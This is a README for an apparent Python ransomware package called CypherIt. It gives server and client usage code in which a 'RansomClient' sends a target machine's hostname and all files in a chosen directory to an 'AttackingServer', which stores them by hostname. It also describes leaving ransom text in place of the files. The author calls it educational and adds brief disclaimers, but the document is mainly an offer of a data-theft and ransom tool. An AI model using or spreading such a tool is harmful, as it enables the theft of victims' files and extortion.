CypherIt
========

CypherIt is an intelligent tool which renames all the files to a txt file in a binder.You can write what ever you want.

All the files of the target will be saved in your directory and you can do what ever you want.

Inspired by:
==========
B.I.GG

HOW DOES CYPHERIT WORK
======================

If you are familiar to my style of packages. You already know how simple it is

First of all create a server:

Server
------
````python
import CyphterIt as ci

ip, port = "127.0.0.1", 1234

server = ci.AttackingServer(ip, port)
server.start()
````

Client
------
````python
import CyphterIt as ci

ip, port, path, text = "127.0.0.1", 1234, r"C:\\test", "the one and only"
#You have to specify the path because this was just build for educational purposes. So please do not use it for bad thinks

data = ci.RansomClient(ip, port, path, text)
data.start()
````

You always have to run the server first and then the client.

The hostname of the target will be sent to your server

A Directory with the hostname of the target will be created.

All the data of target will be stored in that directory

Additional
=========
* PLEASE DO NOT HACK SOMEONE FOREIGN